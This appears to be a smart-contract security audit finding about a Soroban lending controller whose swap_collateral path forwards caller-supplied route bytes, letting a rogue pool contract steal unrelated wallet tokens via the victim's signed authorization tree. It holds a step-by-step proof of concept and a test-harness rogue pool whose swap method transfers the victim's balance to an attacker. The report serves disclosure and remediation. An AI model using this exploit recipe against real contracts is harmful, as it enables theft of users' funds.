### Title
Attacker-controlled swap XDR can invoke a malicious pool that steals arbitrary authorized wallet tokens - (File: contracts/controller/src/strategies/swap_collateral.rs)

### Summary
The controller forwards caller-supplied `swap` bytes to the configured router without independently constraining the contracts encoded in that payload. The router decodes those bytes into a `StrategyPayload` whose `assets` registry can contain an arbitrary pool contract and whose `ops` program selects that address for execution. During `swap_collateral`, a malicious Soroswap/Phoenix/Aquarius-shaped pool can execute code below the caller’s authorization root and request a token transfer from the victim to the attacker. If simulation adds that transfer to the authorization tree and the victim signs it, the malicious pool can steal unrelated wallet funds while still returning enough output for the strategy to succeed. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`swap_collateral` accepts attacker-controlled `swap: StrategySwap` bytes as part of the position action parameters and requires only that the caller be the account owner or an active delegate. [4](#0-3) [5](#0-4) 

`swap_tokens` passes those bytes unchanged to `SwapAggregatorClient::execute_strategy` after authorizing only the controller’s exact input transfer to the router. [1](#0-0) 

The router decodes `swap_xdr` as a `StrategyPayload` containing `amounts`, `assets`, and the packed `ops` program. [6](#0-5)  Structural validation bounds indices, opcodes, modes, and lengths, but does not restrict an asset-registry `pool` address to a known venue contract. [7](#0-6) 

For a Soroswap opcode, the router trusts the decoded pool address for both `get_reserves` and `swap`. [8](#0-7)  The transaction-level test demonstrates the resulting authorization behavior: a payload-selected rogue pool’s `swap` method calls `token.transfer(victim, attacker, amount)`, simulation records it as a child of the caller’s `swap_collateral` authorization, and signing that tree permits the transfer. [9](#0-8) [10](#0-9) 

### Impact Explanation
This enables theft of user funds beyond the collateral amount intentionally routed through the strategy. The malicious payload can cause a transfer of any token held by the victim to an attacker-controlled recipient, provided that token transfer is included in the authorization tree the victim signs. The transaction can simultaneously return the requested output token, satisfy the router’s measured output checks, and leave the lending position valid, so the strategy’s ordinary balance-delta and solvency checks do not prevent the unrelated wallet-token theft. [11](#0-10) [12](#0-11) 

The same caller-controlled route bytes are accepted by other strategy paths that call `swap_tokens`, including `multiply`, `swap_debt`, and `repay_debt_with_collateral`, because they share the same router helper. [13](#0-12) 

### Likelihood Explanation
An unprivileged attacker can deploy a contract that exposes the expected pool functions, encode its address in the `assets` registry, and provide the resulting XDR through any route-generation path consumed by a victim. The victim does not need to grant a prior allowance or transfer tokens to the attacker; signing the transaction’s simulated authorization tree supplies the nested authority required by the rogue transfer.

The exploit requires the victim to sign an authorization tree containing an unexpected token-transfer child. Wallets or clients that display and enforce a strict expected authorization tree can reject it, while flows that sign simulation output without decoding the route remain exposed.

### Recommendation
Bind route pool addresses to a governance-controlled, venue-specific allowlist before dispatching a swap opcode. At minimum, reject any decoded `assets[idx_a]` pool address that is not registered for the selected venue, and enforce the same restriction for Aquarius burn/mint pool and share-token metadata.

Clients should additionally decode `swap_xdr`, verify every pool and token address against expected route data, simulate the complete transaction, and reject any authorization entry other than the exact expected token transfers. This mitigation protects callers but does not replace contract-level pool allowlisting.

### Proof of Concept
1. Attacker deploys `RoguePool`, which implements:
   - `get_reserves() -> (reserve_in, reserve_out)` returning values sufficient for a positive Soroswap quote;
   - `swap(amount_0_out, amount_1_out, to)`;
   - inside `swap`, calls `unrelated_token.transfer(victim, attacker, victim_balance)` and transfers enough `token_out` to the router.
2. Attacker builds `StrategyPayload`:
   - `assets[0] = input_token`;
   - `assets[1] = output_token`;
   - `assets[2] = RoguePool`;
   - `amounts[0] = positive_min_out`;
   - one Soroswap instruction `(opcode=0, mode=All, pool=2, token_in=0, token_out=1)`.
3. Victim calls `swap_collateral(caller=victim, account_id, current=input_hub_asset, from_amount, new=output_hub_asset, swap=malicious_xdr)`.
4. Controller withdraws the victim collateral, authorizes its exact input transfer to the configured router, and invokes `execute_strategy(controller, amount_in, malicious_xdr)`. [14](#0-13) 
5. The router invokes `RoguePool.swap`. The rogue pool requests `unrelated_token.transfer(victim, attacker, victim_balance)`, and simulation records that transfer as a child of the victim’s authorization.
6. If the victim signs the simulated tree, the unrelated token transfer executes, the rogue pool returns sufficient output, router measurement succeeds, and `swap_collateral` finalizes normally.

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L13-20)
```rust
pub(crate) fn swap_tokens(
    env: &Env,
    refund_to: &Address,
    token_in: &Address,
    amount_in: i128,
    token_out: &Address,
    swap: &StrategySwap,
) -> i128 {
```

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/swap-aggregator/src/types.rs (L38-45)
```rust
pub struct StrategyPayload {
    /// Amount registry: min-out, fixed inputs, burn floors, mint min-shares.
    pub amounts: Vec<i128>,
    /// Address registry: tokens, pools, and LP share tokens.
    pub assets: Vec<Address>,
    /// Packed program: header, instruction records, split weights.
    pub ops: Bytes,
}
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L51-88)
```rust
pub(crate) fn swap(ctx: &HopContext<'_>) {
    let token_in_is_0 = ctx.hop.token_in < ctx.hop.token_out;

    let no_args: Vec<Val> = vec![ctx.env];
    let (reserve_0, reserve_1): (i128, i128) = ctx.env.invoke_contract(
        &ctx.hop.pool,
        &Symbol::new(ctx.env, "get_reserves"),
        no_args,
    );
    let (reserve_in, reserve_out) = if token_in_is_0 {
        (reserve_0, reserve_1)
    } else {
        (reserve_1, reserve_0)
    };

    let requested_out = soroswap_amount_out(ctx.env, ctx.amount_in, reserve_in, reserve_out);
    if requested_out <= 0 {
        panic_with_error!(ctx.env, Error::ZeroOutput);
    }

    let token_client = token::Client::new(ctx.env, &ctx.hop.token_in);
    token_client.transfer(ctx.router, &ctx.hop.pool, &ctx.amount_in);

    let (amount_0_out, amount_1_out) = if token_in_is_0 {
        (0_i128, requested_out)
    } else {
        (requested_out, 0_i128)
    };
    let args: Vec<Val> = vec![
        ctx.env,
        amount_0_out.into_val(ctx.env),
        amount_1_out.into_val(ctx.env),
        ctx.router.into_val(ctx.env),
    ];
    let _: () = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
}
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L17-23)
```rust
pub(crate) struct SwapCollateralParams<'a> {
    pub account_id: u64,
    pub current: &'a HubAssetKey,
    pub from_amount: i128,
    pub new: &'a HubAssetKey,
    pub swap: &'a StrategySwap,
}
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-48)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-76)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );

    let deposit_assets = vec![env, (new.clone(), swapped_amount)];
    supply::process_deposit(
        env,
        &env.current_contract_address(),
        &mut account,
        &deposit_assets,
        &mut cache,
    );

    strategy_finalize(env, account_id, &mut account, &mut cache);
```

**File:** contracts/swap-aggregator/src/lib.rs (L245-255)
```rust
    /// Decodes `swap_xdr` as a `StrategyPayload` and runs it for `sender`.
    ///
    /// Requires `sender` authorization. Pulls `total_in` of the input token, runs the
    /// instruction stream, applies fees, checks the minimum output, and returns the amount
    /// delivered to `sender`. Panics with `Error::InvalidRouteXdr` if the XDR does not decode.
    fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        renew_instance(&env);
        let payload = StrategyPayload::from_xdr(&env, &swap_xdr)
            .unwrap_or_else(|_| panic_with_error!(&env, Error::InvalidRouteXdr));
        execute::run(env, sender, total_in, payload)
    }
```

**File:** contracts/swap-aggregator/src/program.rs (L239-303)
```rust
    fn validate(&self, env: &Env, assets_len: u32, amounts_len: u32, weight_count: u32) {
        for i in 0..self.op_count {
            let record = self.raw(i);
            let Some(opcode) = Opcode::from_u8(record[field::OPCODE]) else {
                panic_with_error!(env, Error::InvalidRouteXdr);
            };
            let mode = Mode::from_u8(record[field::MODE]);
            let (idx_a, idx_b, idx_c) = (
                record[field::POOL] as u32,
                record[field::TOKEN_IN] as u32,
                record[field::TOKEN_OUT] as u32,
            );

            // `Prev` is a purely structural link: the predecessor must exist,
            // must have a single output, and that output must be this
            // instruction's input.
            if mode == Mode::Prev {
                if i == 0 {
                    panic_with_error!(env, Error::BrokenTokenChain);
                }
                let previous = self.raw(i - 1);
                let produced = match Opcode::from_u8(previous[field::OPCODE]) {
                    // A swap produces its `token_out`, a mint its share token.
                    Some(Opcode::Swap(_)) => previous[field::TOKEN_OUT],
                    Some(Opcode::Mint) => previous[field::TOKEN_IN],
                    // A burn releases every constituent at once.
                    _ => panic_with_error!(env, Error::BrokenTokenChain),
                };
                if idx_b != produced as u32 {
                    panic_with_error!(env, Error::BrokenTokenChain);
                }
            }
            match mode {
                Mode::Fixed(idx) if idx as u32 >= amounts_len => {
                    panic_with_error!(env, Error::InvalidRouteXdr)
                }
                Mode::Ppm(idx) if idx as u32 >= weight_count => {
                    panic_with_error!(env, Error::InvalidRouteXdr)
                }
                _ => {}
            }

            if idx_a >= assets_len || idx_b >= assets_len {
                panic_with_error!(env, Error::InvalidRouteXdr);
            }
            match opcode {
                Opcode::Swap(_) => {
                    if idx_c >= assets_len {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                    if idx_b == idx_c {
                        panic_with_error!(env, Error::SameToken);
                    }
                }
                // Liquidity legs spend the full vault balance, so only `Mode::All` is valid.
                Opcode::Burn | Opcode::Mint => {
                    if mode != Mode::All {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                    if idx_c >= amounts_len {
                        panic_with_error!(env, Error::InvalidRouteXdr);
                    }
                }
            }
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L125-135)
```rust
    let total_out = vault.balance_of(&output_token);
    if total_out < total_min_out {
        panic_with_error!(&env, Error::SlippageExceeded);
    }

    vault.withdraw(&output_token, total_out);
    token::Client::new(&env, &output_token).transfer(&router, &sender, &total_out);

    residual::accrue_residual_as_revenue(&env, &mut vault);

    total_out
```
